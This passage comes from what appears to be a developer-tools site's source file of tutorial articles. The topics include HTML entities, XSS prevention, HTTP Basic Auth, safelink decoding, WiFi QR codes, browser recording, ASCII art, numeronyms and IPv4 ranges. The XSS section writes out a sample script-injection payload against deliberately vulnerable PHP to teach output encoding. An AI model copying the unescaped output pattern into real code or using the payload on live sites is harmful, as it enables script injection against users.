- \`&sum;\` → ∑ (summation)
- \`&pi;\` → π (pi)

### Arrows
- \`&larr;\` → ← (left arrow)
- \`&rarr;\` → → (right arrow)
- \`&uarr;\` → ↑ (up arrow)
- \`&darr;\` → ↓ (down arrow)
- \`&harr;\` → ↔ (left-right arrow)

## XSS Prevention: HTML Encoding

Cross-Site Scripting (XSS) occurs when user input is displayed in HTML without encoding:

\`\`\`html
<!-- Vulnerable: User input displayed directly -->
Hello, <?= $_GET['name'] ?>

<!-- If name = "><script>alert('xss')</script>< it becomes: -->
Hello, "><script>alert('xss')</script><

<!-- Safe: Encoded output -->
Hello, <?= htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') ?>
\`\`\`

Always encode output, not just on obvious display locations. Encoding must happen at the point of output, not at input time.

## Encoding in Different Languages

### JavaScript
\`\`\`javascript
function escapeHtml(text) {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
\`\`\`

### Python
\`\`\`python
import html
safe = html.escape('<script>alert("xss")</script>')
# &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
\`\`\`

### PHP
\`\`\`php
$safe = htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
\`\`\`

## Using the HTML Entities Tool

Our tool:
1. **Encode text** — convert special characters to HTML entities
2. **Decode entities** — convert HTML entities back to characters
3. **Multiple formats** — choose named, decimal, or hex entities
4. **Character reference** — browse all named HTML entities
5. **Copy output** — one-click copy of encoded/decoded text

Essential for web developers working with user-generated content, building template systems, and testing XSS prevention.
`,
  },
  {
    slug: 'basic-auth-generator-guide',
    toolPath: '/basic-auth-generator',
    title: 'HTTP Basic Authentication: How It Works and How to Generate Headers',
    description: 'Understand HTTP Basic Auth, generate Base64-encoded credentials, and learn when to use (and not use) Basic Auth.',
    keywords: ['basic auth generator', 'HTTP basic auth', 'authorization header', 'basic authentication', 'base64 credentials'],
    category: 'Web',
    publishedAt: '2025-08-25',
    content: `## What Is HTTP Basic Authentication?

**HTTP Basic Authentication** is the simplest form of HTTP authentication. A client sends a username and password with every request, encoded in Base64 and placed in the Authorization header. Despite its simplicity, it's widely used for API access, protecting development environments, and quick authentication needs.

## How Basic Auth Works

The authentication flow:

1. Client makes request without credentials
2. Server responds with \`401 Unauthorized\` and \`WWW-Authenticate: Basic realm="Description"\`
3. Client sends request with \`Authorization: Basic [base64(username:password)]\`
4. Server decodes and verifies credentials
5. If valid, request proceeds; if invalid, another 401 is returned

The Base64 encoding:
\`\`\`
username: admin
password: secret123
Combined: admin:secret123
Base64:   YWRtaW46c2VjcmV0MTIz

Header:   Authorization: Basic YWRtaW46c2VjcmV0MTIz
\`\`\`

## Security Considerations

### Base64 Is Not Encryption
Base64 encoding is trivially reversible — it provides zero security. Anyone who intercepts the Authorization header can decode it instantly. **Always use HTTPS with Basic Auth** to prevent credential interception.

Without HTTPS, Basic Auth credentials are sent in plaintext over the network. This is why Basic Auth over HTTP is considered insecure for anything beyond local development.

### Credential Exposure
The Authorization header is often logged by web servers, proxies, and CDNs. Ensure your logging configurations exclude sensitive headers or redact credential values.

### No Logout Mechanism
Basic Auth has no built-in logout. Browsers cache credentials for the session. Clearing browser cache or closing the browser is required to "log out."

### Credential Management
Since credentials are sent with every request, they must be stored and transmitted carefully:
- Store hashed versions server-side (bcrypt)
- Rotate credentials regularly
- Use per-client credentials (different passwords per API consumer)

## When to Use Basic Auth

**Appropriate uses:**
- Internal tools protected behind VPN or firewall
- Simple API authentication for internal services
- Development and staging environment access control
- Quick protection for low-sensitivity resources
- Machine-to-machine API access (service accounts)

**Not appropriate for:**
- End-user authentication in consumer applications
- Resources accessible without HTTPS
- High-security systems requiring more sophisticated auth
- Systems that need session management or SSO

## Basic Auth in Practice

### Nginx Configuration
\`\`\`nginx
server {
    auth_basic "Restricted Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
}
\`\`\`

Generate htpasswd file:
\`\`\`bash
htpasswd -c /etc/nginx/.htpasswd username
\`\`\`

### Apache Configuration
\`\`\`apache
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Area"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
</Directory>
\`\`\`

### Using curl
\`\`\`bash
curl -u username:password https://api.example.com/endpoint
# or with explicit header
curl -H "Authorization: Basic $(echo -n 'user:pass' | base64)" https://api.example.com/endpoint
\`\`\`

### JavaScript Fetch API
\`\`\`javascript
const credentials = btoa('username:password');
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': \`Basic \${credentials}\`
  }
});
\`\`\`

### Python requests
\`\`\`python
import requests
response = requests.get(
  'https://api.example.com/data',
  auth=('username', 'password')
)
\`\`\`

## Using the Basic Auth Generator

Our tool:
1. **Enter username and password**
2. **Generates the Base64 credential** automatically
3. **Shows the complete Authorization header** ready to copy
4. **Decode mode** — paste an existing Basic Auth header to see credentials
5. **curl command** — generates the complete curl command with authentication

Use it for quickly generating auth headers during API testing, debugging authentication issues, and generating credentials for documentation examples.
`,
  },
  {
    slug: 'safelink-decoder-guide',
    toolPath: '/safelink-decoder',
    title: 'Safelink Decoder: Unwrap Redirected URLs from Email Security Tools',
    description: 'Decode "safe links" wrapped by email security tools (Microsoft ATP, Proofpoint) to see the original URL.',
    keywords: ['safelink decoder', 'Microsoft safelinks', 'Proofpoint URL', 'unwrap URL', 'email redirect decoder'],
    category: 'Web',
    publishedAt: '2025-08-26',
    content: `## What Are Safelinks and URL Wrappers?

Email security gateways and corporate email systems often rewrite URLs in emails by wrapping them in a tracking or scanning proxy URL. These "safe links" or "wrapped URLs" allow the security service to:
- Scan the destination URL for phishing or malware before allowing access
- Track which links users click for analytics and security monitoring
- Block access to known malicious sites in real time

While this provides security benefits, it makes URLs opaque and unreadable, which is why a safelink decoder is useful.

## Common URL Wrapping Services

### Microsoft Defender ATP Safelinks
Microsoft 365 email uses Safelinks to protect users from malicious URLs:
\`\`\`
Original:   https://example.com/page
Wrapped:    https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Fexample.com%2Fpage&data=...
\`\`\`

### Proofpoint URL Defense
Enterprise email security wrapping:
\`\`\`
https://urldefense.proofpoint.com/v2/url?u=https-3A__example.com_page&d=...
\`\`\`

### Mimecast URL Protection
\`\`\`
https://url.uk.m.mimecastprotect.com/s/...?domain=example.com
\`\`\`

### Google Gmail Safety Check
Google sometimes rewrites links for malware scanning.

### HubSpot and Marketing Platform Tracking
Marketing platforms add tracking parameters:
\`\`\`
https://hs-email.hubspot.com/redirect?email=...&url=https%3A%2F%2Fexample.com
\`\`\`

## Why Decode Safelinks?

**Verification before clicking**: The actual destination is hidden by the wrapper. Decoding lets you verify where you're actually going before following the link.

**Sharing links**: When sharing a link from an email, the wrapped version is tied to your account or session. Sharing the decoded original URL is cleaner.

**Debugging**: Developers troubleshooting email links need to see the original URL.

**Archiving**: When documenting email content, you want the stable original URL, not a time-limited or session-specific wrapper.

**API and automation**: Programmatic processing of email content needs clean URLs.

## URL Encoding in Safelinks

Wrapped URLs typically use percent-encoding to embed the original URL as a parameter. The original URL characters are replaced with % followed by their hexadecimal code:
- Space → %20
- : → %3A
- / → %2F
- ? → %3F
- = → %3D
- & → %26
- # → %23

Decoding reverses this transformation, restoring the original URL.

## URL Parameters and Link Tracking

Beyond security wrapping, many links contain tracking parameters:
- \`utm_source\`, \`utm_medium\`, \`utm_campaign\`: Google Analytics tracking
- \`fbclid\`: Facebook click identifier
- \`gclid\`: Google Click ID
- \`mc_eid\`, \`mc_cid\`: Mailchimp tracking

Removing these parameters (while keeping the essential URL structure) gives you the clean destination URL.

## Identifying Malicious Wrapped URLs

Safelink decoders are also useful for security analysis. Red flags in the decoded URL:
- Homograph attacks: \`paypa1.com\` (numeral 1 instead of lowercase L)
- Typosquatting: \`amaz0n.com\`, \`microsoft-update.com\`
- URL shorteners hiding the real destination
- Suspicious TLDs or subdomains mimicking legitimate sites
- URL patterns common in phishing: \`/secure/\`, \`/verify-account/\`, \`/login/\`

Always verify decoded URLs from unexpected or suspicious emails before visiting.

## Using the Safelink Decoder Tool

Our tool:
1. **Paste any wrapped URL** — supports all major safelink formats
2. **Automatic detection** — identifies the wrapping service
3. **Extracts original URL** — URL-decodes the destination parameter
4. **Removes tracking parameters** — optionally strip UTM and tracking codes
5. **Copy clean URL** — one-click copy of the decoded destination
6. **Safety note** — always verify URLs before visiting, even after decoding

Use it for verifying email links, cleaning URLs for sharing, analyzing bulk email content, and debugging marketing email link issues.
`,
  },

  // ─── Remaining tools ──────────────────────────────────────────
  {
    slug: 'wifi-qr-code-guide',
    toolPath: '/wifi-qrcode-generator',
    title: 'WiFi QR Code Generator: Share Network Credentials Instantly',
    description: 'Generate a QR code for your WiFi network. Guests scan it to connect without typing the password.',
    keywords: ['wifi QR code', 'WiFi QR generator', 'share WiFi password', 'WiFi QR code generator'],
    category: 'Images and videos',
    publishedAt: '2025-08-27',
    content: `## What Is a WiFi QR Code?

A WiFi QR code encodes your network credentials in a standardized format that allows smartphones to automatically connect to your WiFi network by simply scanning the code. No more reading out complex passwords character by character — one scan connects instantly.

## WiFi QR Code Format

The WiFi QR code format (defined in the ZXing library specification):
\`\`\`
WIFI:T:WPA;S:NetworkName;P:MyPassword;;
\`\`\`

Parameters:
- **T**: Security type (WPA, WEP, or empty for open networks)
- **S**: SSID (network name)
- **P**: Password
- **H**: Optional hidden SSID flag (true or false)

Multiple values use semicolons as separators, and the string ends with \`;;\` (double semicolon).

## Special Character Escaping

If your SSID or password contains special characters, they must be escaped with a backslash:
- \`\\\` (backslash) → \`\\\\\`
- \`;\` (semicolon) → \`\\;\`
- \`,\` (comma) → \`\\,\`
- \`"\` (double quote) → \`\\"\`

Example with special characters:
\`\`\`
SSID: My "Network" #1
Password: P@ss;word
Format: WIFI:T:WPA;S:My \\"Network\\" #1;P:P@ss\\;word;;
\`\`\`

## Security Types

| Type | String | Notes |
|------|--------|-------|
| WPA/WPA2/WPA3 Personal | \`WPA\` | Standard home/office WiFi |
| WEP (deprecated) | \`WEP\` | Insecure, avoid using |
| Open/No password | (empty T) | Public networks |

WPA3 uses the same QR format as WPA2 — the \`WPA\` type covers all WPA variants.

## Platform Support

### iOS
iPhone cameras (iOS 11+) natively scan WiFi QR codes. A notification appears offering to join the network.

### Android
Android 10+ supports WiFi QR codes in the native camera app. Earlier Android versions require a QR scanner app (like Google Lens).

### macOS
macOS cameras do not natively support WiFi QR codes (as of 2024). Requires a third-party app.

## Hidden SSIDs

For networks with hidden SSIDs (not broadcasting their name):
\`\`\`
WIFI:T:WPA;S:HiddenNetworkName;P:MyPassword;H:true;;
\`\`\`

The \`H:true\` parameter tells the device to connect to a hidden network with this exact SSID.

## WiFi QR Codes for Guest Networks

WiFi QR codes are especially valuable for:
- **Home**: Print and display for guests to easily connect
- **Offices**: Post at reception or in meeting rooms
- **Restaurants and cafes**: Display on tables or at the counter
- **Hotels**: Place in rooms and common areas
- **Events**: Display at registration or on event materials

A well-designed QR code with your network name and logo creates a professional impression while simplifying connectivity.

## Security Considerations

### Physical Security
Anyone who photographs your WiFi QR code gets your password. Place QR codes thoughtfully:
- Guest network QR codes in guest areas only
- Don't display your main network credentials publicly
- Consider separate guest networks with limited access

### Password Visibility
Unlike traditional password sharing (where the password is visible), QR codes allow sharing credentials without the password being legible to bystanders.

### Rotation
When you change your WiFi password, update your QR code. Use a QR code management service or reprint physical codes.

## Design Tips for Printed WiFi QR Codes

### Size
- Minimum 2cm × 2cm for typical scanning distances
- 5cm × 5cm or larger for posters

### Error Correction
Use H (High, 30% recovery) level to accommodate logo overlays and potential damage on printed materials.

### Include Text
Always accompany QR codes with:
- Your network name (SSID)
- A brief instruction ("Scan to connect to WiFi")
- Your brand/logo if appropriate

### Background and Colors
High contrast required — dark code on light background. Avoid red on green, blue on black, or other low-contrast combinations.

## Using the WiFi QR Code Generator

Our tool:
1. **Enter network name (SSID)**
2. **Select security type** (WPA/WPA2, WEP, or open)
3. **Enter password** (hidden for privacy)
4. **Toggle hidden network** option if applicable
5. **Generate QR code** instantly
6. **Download as PNG or SVG** for printing or digital display

The generated QR code works with both iOS and Android devices, allowing instant network connection without typing the password.
`,
  },
  {
    slug: 'camera-recorder-guide',
    toolPath: '/camera-recorder',
    title: 'Browser Camera Recorder: Record Video Directly from Your Browser',
    description: 'Record video from your webcam directly in the browser. No software installation required.',
    keywords: ['browser camera recorder', 'webcam recorder online', 'record video browser', 'MediaRecorder API'],
    category: 'Images and videos',
    publishedAt: '2025-08-28',
    content: `## Browser-Based Video Recording

The browser's MediaRecorder API (part of the WebRTC specification) allows recording audio and video directly from the user's camera and microphone, with no plugins or additional software required. This capability enables a range of applications: video messaging, screen recording tools, remote interviews, and more.

## How MediaRecorder Works

The recording process involves several Web APIs working together:

### 1. Requesting Camera Access
\`\`\`javascript
const stream = await navigator.mediaDevices.getUserMedia({
  video: { width: 1280, height: 720 },
  audio: true
});
\`\`\`

The browser prompts the user for permission. The returned MediaStream contains video and audio tracks.

### 2. Displaying Preview
\`\`\`javascript
const videoElement = document.querySelector('video');
videoElement.srcObject = stream;
videoElement.play();
\`\`\`

The live camera feed is attached directly to a video element for real-time preview.

### 3. Recording
\`\`\`javascript
const chunks = [];
const recorder = new MediaRecorder(stream, {
  mimeType: 'video/webm;codecs=vp9,opus'
});

recorder.ondataavailable = (e) => chunks.push(e.data);
recorder.onstop = () => {
  const blob = new Blob(chunks, { type: 'video/webm' });
  const url = URL.createObjectURL(blob);
  downloadLink.href = url;
};

recorder.start(1000); // Collect data every 1 second
\`\`\`

### 4. Stopping and Downloading
\`\`\`javascript
recorder.stop();
stream.getTracks().forEach(track => track.stop()); // Release camera
\`\`\`

## Video Formats and Codecs

MediaRecorder format support varies by browser:

| Format | Chrome | Firefox | Safari |
|--------|--------|---------|--------|
| video/webm | Yes | Yes | No |
| video/mp4 | Partial | No | Yes |
| video/ogg | No | Yes | No |

For maximum compatibility, check support and use the best available format:
\`\`\`javascript
const mimeTypes = [
  'video/webm;codecs=vp9,opus',
  'video/webm;codecs=vp8,opus',
  'video/webm',
  'video/mp4'
];
const mimeType = mimeTypes.find(m => MediaRecorder.isTypeSupported(m));
\`\`\`

## Video Resolution and Quality Settings

Camera constraints allow specifying preferred video quality:

\`\`\`javascript
const constraints = {
  video: {
    width: { ideal: 1920, max: 3840 },  // 4K max, prefer 1080p
    height: { ideal: 1080 },
    frameRate: { ideal: 30, max: 60 },
    facingMode: 'user'  // Front camera on mobile
  },
  audio: {
    echoCancellation: true,
    noiseSuppression: true,
    sampleRate: 44100
  }
};
\`\`\`

These are hints — the browser and hardware may not support all requested settings.

## Screen Recording

The \`getDisplayMedia()\` API enables recording the user's screen or a specific window:
\`\`\`javascript
const screenStream = await navigator.mediaDevices.getDisplayMedia({
  video: { mediaSource: 'screen' },
  audio: true  // System audio (not supported on all platforms)
});
\`\`\`

Combining screen and microphone:
\`\`\`javascript
const screenStream = await navigator.mediaDevices.getDisplayMedia({video: true});
const micStream = await navigator.mediaDevices.getUserMedia({audio: true});

const combinedStream = new MediaStream([
  ...screenStream.getTracks(),
  ...micStream.getTracks()
]);
\`\`\`

## Privacy and Permissions

### Permission States
Camera access can be:
- **Granted**: User previously approved
- **Denied**: User blocked access
- **Prompt**: Will ask the user

### Checking Permission Status
\`\`\`javascript
const permission = await navigator.permissions.query({ name: 'camera' });
console.log(permission.state); // 'granted', 'denied', or 'prompt'
\`\`\`

### Indicator Requirements
Most browsers show a recording indicator when camera/microphone is active. This cannot be suppressed.

### HTTPS Requirement
Camera and microphone access requires HTTPS or localhost. Insecure HTTP sites cannot access these APIs.

## Use Cases

- **Video messages**: Loom-style async video messages
- **Interview tools**: Browser-based video interviews
- **Content creation**: Quick video clips and social content
- **Support tools**: Record and share bug reproductions
- **Education**: Lecture capture and student submissions
- **Medical**: Telehealth symptom documentation

## Using the Camera Recorder Tool

Our tool provides:
1. **Camera selection** — choose front or back camera, or external cameras
2. **Resolution presets** — 480p, 720p, or 1080p
3. **Start/Stop recording** — with visual recording indicator and timer
4. **Pause and resume** — pause recording while keeping the session active
5. **Preview playback** — review recordings before downloading
6. **Download** — save recordings as WebM files
7. **Processing status** — clear feedback during encoding

All recording happens locally in your browser — no video data is uploaded to any server.
`,
  },
  {
    slug: 'ascii-art-generator-guide',
    toolPath: '/ascii-text-drawer',
    title: 'ASCII Art Text Generator: Create Text Art for Terminals and READMEs',
    description: 'Convert text to ASCII art using FIGlet fonts. Perfect for terminal banners, README headers, and retro designs.',
    keywords: ['ASCII art generator', 'ASCII text', 'FIGlet', 'text art', 'terminal banner'],
    category: 'Text',
    publishedAt: '2025-08-29',
    content: `## What Is ASCII Art?

ASCII art is a graphic design technique that creates images using printable characters from the ASCII (American Standard Code for Information Interchange) standard. Instead of pixels, images are composed from characters like letters, numbers, punctuation marks, and special symbols. It's both a technical craft and a digital art form with a rich history dating back to the earliest days of computing.

## A Brief History of ASCII Art

ASCII art predates the internet. Early practitioners created images in the 1960s and 1970s using typewriters, a form called "typewriter art." When teletype machines and early printers could only output characters, ASCII art was the only way to include "graphics" in computer output.

The form flourished in the 1980s-1990s on bulletin board systems (BBS), where users decorated profiles, created scene group headers, and built elaborate artwork using only text characters. The ANSI art scene used 256-color escape codes to create vibrant, detailed works.

## Types of ASCII Art

### Single-Line Emoticons
Horizontal emoticons and decorations used in everyday text communication.

### Multi-Line Block Art
Traditional ASCII art composed across multiple lines to depict animals, faces, or scenes using character density.

### Text-to-ASCII Art (Big Text)
Rendering text using ASCII characters as font pixels, creating large stylized lettering for banners and headers.

### Shaded Art
Using the visual density of different characters to create light and shadow effects, simulating grayscale images.

## ASCII Art Fonts

The most popular standard for big text ASCII art is **FIGlet** format. Common FIGlet fonts include:
- **Standard** — Classic serif-style ASCII letters
- **Banner** — Wide, bold block letters
- **Block** — Solid block characters
- **Bubble** — Rounded, soft-looking letters
- **Slant** — Italic-style diagonal characters
- **3D** — Three-dimensional extruded appearance
- **Doom** — Rough, aggressive style popular in the hacker scene
- **Big** — Large detailed letterforms
- **Script** — Cursive-style ASCII letters

## Character Density and Shading

For photo-to-ASCII conversion, characters are chosen based on their "visual density." From lightest to darkest, a typical character set progression:
\`. : - = + * # % @\`

Different sets suit different aesthetics — minimal sets create clean, sparse art, while extended sets enable finer gradients and more photorealistic results.

## ASCII Art in Programming

ASCII art appears throughout developer culture:

### Code Comments and Documentation
Many open source projects use ASCII art for README banners and section headers in large code files, creating visual landmarks in long documents.

### Easter Eggs in Terminals
Many command-line tools and programs hide ASCII art in their output. The classic \`apt-get moo\` in Debian displays a cow with a philosophical message.

### Network Diagrams
Network engineers use ASCII to document topologies in plain text files, which works beautifully in version-controlled documentation and Markdown files.

### Protocol Documentation
Visualizing packet structures and data formats using ASCII diagrams is a common pattern in RFCs and technical specifications.

## Using the ASCII Text Drawer

Our ASCII art generator offers:

1. **Custom text input** — Type any message and see it rendered in ASCII
2. **Font selection** — Choose from dozens of FIGlet-compatible fonts
3. **Width control** — Adjust maximum width to fit your terminal
4. **Character set** — Switch between standard ASCII and extended characters
5. **Copy to clipboard** — Instantly copy the generated art
6. **Export options** — Save as plain text or copy formatted for code comments

## Practical Uses

- **Terminal welcome messages** — Style your SSH login banners
- **Code headers** — Mark major sections in large files
- **README files** — Stand out on GitHub with a distinctive header
- **Email signatures** — Add retro flair in monospaced email clients
- **Game development** — Roguelike and text-adventure interface elements
- **Protocol documentation** — Visualize packet structures and formats

ASCII art combines technical constraints with artistic creativity — proving that limitations often inspire the most inventive solutions. The constraint of working only with printable characters has produced an enduring art form that continues to thrive in developer culture today.
`,
  },
  {
    slug: 'numeronym-generator-guide',
    toolPath: '/numeronym-generator',
    title: 'Numeronyms Explained: i18n, a11y, k8s and How They\'re Created',
    description: 'Learn what numeronyms are, why they exist in tech culture, and generate numeronyms for any word.',
    keywords: ['numeronym generator', 'i18n meaning', 'a11y meaning', 'k8s meaning', 'numeronym'],
    category: 'Text',
    publishedAt: '2025-08-30',
    content: `## What Is a Numeronym?

A numeronym is a word where a number is used to form an abbreviation. The most common type replaces the middle letters of a word with a count of how many letters were omitted. This creates compact abbreviations that programmers, tech writers, and organizations use as shorthand.

## How Numeronyms Work

The basic pattern: **first letter + number of omitted letters + last letter**

Common examples:
- **i18n** — internationalization (18 letters between i and n)
- **a11y** — accessibility (11 letters between a and y)
- **l10n** — localization (10 letters between l and n)
- **K8s** — Kubernetes (8 letters between K and s)
- **g11n** — globalization
- **a12n** — authorization

## Famous Tech Numeronyms

### i18n (Internationalization)
The process of designing software so it can be adapted to different languages and regions. The term was shortened to i18n in the 1970s-80s. It covers date/time formatting, currency display, text direction (RTL/LTR), character encoding, and number formatting.

### a11y (Accessibility)
Making digital products usable by people with disabilities. Encompasses screen reader compatibility, keyboard navigation, color contrast ratios, alternative text for images, and ARIA attributes.

### l10n (Localization)
The process of adapting internationalized software for a specific locale, including translation, cultural adjustments, and compliance with local regulations.

### K8s (Kubernetes)
The container orchestration platform. The numeronym was popularized within Google and the Kubernetes community and is now the standard abbreviation in the container ecosystem.

## Other Types of Numeronyms

### Number Homophones
Words where numbers sound like the replaced letters:
- **Y2K** — Year 2000
- **W3C** — World Wide Web Consortium
- **L8R** — Later
- **B4** — Before
- **GR8** — Great

### Portmanteau Numeronyms
Company and product names incorporating numbers:
- **3M** — Minnesota Mining and Manufacturing
- **7-Eleven** — Named after original operating hours
- **A1** — Best quality grade

## Numeronyms in Software Development

Developers use numeronyms extensively in API documentation, configuration files, and package names. Examples:
- \`vue-i18n\` — Vue.js internationalization plugin
- \`react-a11y\` — React accessibility utilities
- \`k8s-client\` — Kubernetes API client libraries

Configuration files frequently reference these abbreviations in keys and comments, making them essential vocabulary for any developer working with internationalized or accessible software.

## Creating Your Own Numeronyms

Rules for creating a standard numeronym:
1. Take the first letter of the word
2. Count the letters between first and last
3. Take the last letter
4. Combine: \`first + count + last\`

For proper nouns, capitalize as appropriate — Kubernetes becomes K8s (capital K, lowercase s), while internationalization becomes i18n (all lowercase).

## Why Numeronyms Persist

In an age of autocomplete and copy-paste, why do numeronyms survive?

1. **Typing efficiency** — i18n is significantly faster to type than internationalization
2. **Visual compactness** — Better for column-constrained environments (code, spreadsheets, terminal output)
3. **Domain identification** — Marks familiarity with the tech community
4. **Memorability** — Paradoxically, the abbreviation often becomes more recognizable than the full word

The numeronym generator lets you instantly create numeronyms for any word — useful for creating consistent abbreviations in documentation, code comments, and technical writing. Simply enter a word and get its numeronym form, along with the ability to batch-process multiple terms at once.
`,
  },
  {
    slug: 'random-decision-picker-guide',
    toolPath: '/random-decision-picker',
    title: 'Random Decision Picker: How to Make Unbiased Random Choices',
    description: 'Pick a random item from a list. Use it for team assignments, choosing restaurants, or any fair random selection.',
    keywords: ['random decision picker', 'random choice', 'random picker', 'random selector', 'pick random'],
    category: 'Text',
    publishedAt: '2025-08-31',
    content: `## The Psychology of Decision Fatigue

Making decisions consumes mental energy. Research shows that after making many decisions throughout the day, decision quality deteriorates — a phenomenon called **decision fatigue**. This explains why judges make harsher rulings later in the day and why executives make poorer choices in afternoon meetings.

For low-stakes decisions where any choice is roughly equivalent, offloading the decision to a random picker eliminates cognitive drain and preserves mental resources for decisions that truly matter.

## When to Use a Random Decision Picker

### Low-Stakes Choices
- Where to eat lunch when all options are acceptable
- Which movie to watch when everyone is indifferent
- What activity to do when all choices sound equally fun
- Which work task to start when all have equal priority

### Fair Selection
- Choosing who presents first in a meeting
- Selecting a winner for a giveaway or raffle
- Deciding turn order in games
- Assigning tasks to team members equitably

### Breaking Deadlocks
- When a group is equally split between options
- Escaping the paradox of choice after thorough research
- Committing to action rather than endlessly deliberating

### Avoiding Unconscious Bias
Humans have unconscious biases in selection. Randomness removes them for sample selection in research, A/B test group assignment, and random code review assignment.

## How True Randomness Works

Computers struggle with true randomness — they're deterministic machines. To generate random numbers, they use two approaches:

### Pseudo-Random Number Generators (PRNGs)
Most \`random()\` functions use mathematical algorithms that produce sequences which appear random but are actually deterministic if you know the seed. Examples include the Mersenne Twister (widely used in Python and PHP) and Xorshift. These are fine for non-security applications like games and simulations.

### Cryptographically Secure PRNGs (CSPRNGs)
For security-sensitive randomness, hardware entropy sources (mouse movements, keyboard timing, hardware noise) are mixed into a cryptographic algorithm. Examples include \`crypto.getRandomValues()\` in browsers and \`/dev/urandom\` on Linux/macOS.

Our random decision picker uses \`crypto.getRandomValues()\` — ensuring each selection is genuinely unpredictable and fair.

## The Gambler's Fallacy

A common misconception: if heads came up 5 times in a row, tails is "due." This is the gambler's fallacy. Each coin flip is independent — past results don't influence future probabilities.

Similarly, in a random picker, if "Pizza" was selected 3 times in a row, it has exactly the same probability of being selected again. The probability of any option is always 1 divided by the number of options.

## Alternatives to Pure Random Selection

### Weighted Randomness
Give different probabilities to different options based on preferences or priorities while still introducing randomness within those preferences.

### Elimination Rounds
Remove options that have been recently selected to guarantee variety over time, preventing the same choice from appearing too frequently.

### Round-Robin with Randomization
Cycle through all options randomly, then reshuffle and repeat, guaranteeing each option appears equally often over many selections.

## Using the Random Decision Picker

Our tool is designed for simplicity and fairness:

1. **Add your options** — Enter each option on a new line or separated by commas
2. **Pick a winner** — Click the button for an animated random selection
3. **Re-roll** — Roll again if needed (but commit to the first pick for true fairness!)
4. **Adjust options** — Add, remove, or edit options at any time

The tool uses the Web Crypto API's \`crypto.getRandomValues()\` for genuine cryptographic randomness — not \`Math.random()\` which could theoretically be predicted.

## The "Coin Toss Revelation" Technique

A useful technique from behavioral economics: flip a coin (or use the random picker) and note your gut reaction to the result. If you feel disappointed by the outcome, that reveals your true preference. Use the random picker not as the final answer but as a mirror reflecting what you actually want.

Randomness isn't about avoiding responsibility — it's about channeling decision-making energy toward choices where it genuinely matters and eliminating decision fatigue on choices where any option is acceptable.
`,
  },
  {
    slug: 'ipv4-range-expander-guide',
    toolPath: '/ipv4-range-expander',
    title: 'IPv4 Range Expander: List All IPs in a CIDR Range',
    description: 'Expand a CIDR range or IP range into a complete list of individual IP addresses.',
    keywords: ['IPv4 range', 'CIDR expander', 'list IP addresses', 'IP range calculator', 'subnet to IP list'],
    category: 'Network',
    publishedAt: '2025-09-01',
    content: `## Understanding IP Address Ranges

In networking, you often need to work with ranges of IP addresses — whether defining firewall rules, configuring subnets, allocating DHCP pools, or specifying access control lists. IP ranges can be expressed in multiple formats, each suited for different purposes.

## IP Range Notation Formats

### CIDR Notation
**Classless Inter-Domain Routing (CIDR)** is the standard format for modern networks. The number after the slash indicates how many bits are in the network portion.

Examples: \`192.168.1.0/24\`, \`10.0.0.0/8\`, \`172.16.0.0/12\`

### Range Notation
Direct start-to-end specification: \`192.168.1.1 - 192.168.1.254\`

### Wildcard Mask
Used in Cisco ACLs (Access Control Lists), a wildcard mask is the bitwise inverse of a subnet mask.

### Subnet Mask
Traditional notation still used in many network interfaces and older documentation.

## How CIDR Prefix Lengths Work

The prefix length determines how many addresses are in the range:

| CIDR | Addresses | Usable Hosts | Common Use |
|------|-----------|--------------|------------|
| /8 | 16,777,216 | 16,777,214 | Large enterprise, ISP |
| /16 | 65,536 | 65,534 | Medium organization |
| /24 | 256 | 254 | Small network segment |
| /26 | 64 | 62 | Small VLAN |
| /28 | 16 | 14 | Tiny segment |
| /30 | 4 | 2 | Point-to-point link |
| /32 | 1 | 1 | Host route |

Usable hosts equals total addresses minus 2 (network address and broadcast address).

## Converting Between Formats

### CIDR to Range
Given \`192.168.10.0/25\`:
- Prefix /25 means 7 host bits
- Total addresses: 128
- Range: 192.168.10.0 to 192.168.10.127
- Usable: 192.168.10.1 to 192.168.10.126

### Range to CIDR
Given range 192.168.1.64 to 192.168.1.127:
- Count: 64 addresses
- 64 = 2^6, so 6 host bits
- Prefix: 32 - 6 = /26
- CIDR: 192.168.1.64/26

## Private vs. Public IP Ranges

RFC 1918 defines three private IP ranges:
- \`10.0.0.0/8\` — Large private networks
- \`172.16.0.0/12\` — Medium private networks
- \`192.168.0.0/16\` — Home and small office networks

Additional special ranges include loopback (\`127.0.0.0/8\`), link-local (\`169.254.0.0/16\`), multicast (\`224.0.0.0/4\`), and reserved (\`240.0.0.0/4\`).

## Practical Use Cases

### Firewall Rules
IP range specifications control which networks can access services. Both CIDR notation and explicit ranges are used in firewalls, security groups, and ACLs.

### Cloud Security Groups (AWS/GCP/Azure)
Cloud platforms use CIDR notation in security group rules to specify allowed source and destination IP ranges for inbound and outbound traffic.

### Web Server IP Restrictions
Nginx and Apache support CIDR-based access control to restrict admin areas or APIs to specific IP ranges.

### DHCP Pool Configuration
DHCP servers define address pools using start and end IP addresses, which need to fall within the subnet range but exclude reserved addresses.

## Using the IPv4 Range Expander

Our tool helps you:
1. **Enter a CIDR block** and expand it to show all individual IP addresses
2. **Enter a range** (start-end) and convert to CIDR notation
3. **View network details** — network address, broadcast, mask, host count
4. **Copy expanded list** — Export all IPs for use in allow/deny lists
5. **Check if an IP** falls within a given range

The tool handles the binary math automatically, making IP range management accessible even without deep subnetting knowledge. It's ideal for network documentation, firewall rule creation, and subnet planning.
`,
  },
  {
    slug: 'ipv4-address-converter-guide',
    toolPath: '/ipv4-address-converter',
    title: 'IPv4 Address Converter: Decimal, Binary, Hex, and Integer',
    description: 'Convert IPv4 addresses between dotted decimal, binary, hexadecimal, and 32-bit integer representations.',
    keywords: ['IPv4 converter', 'IP address binary', 'IP to hex', 'IP address integer', 'IP address format'],
    category: 'Network',
    publishedAt: '2025-09-02',
    content: `## Understanding IPv4 Address Representations

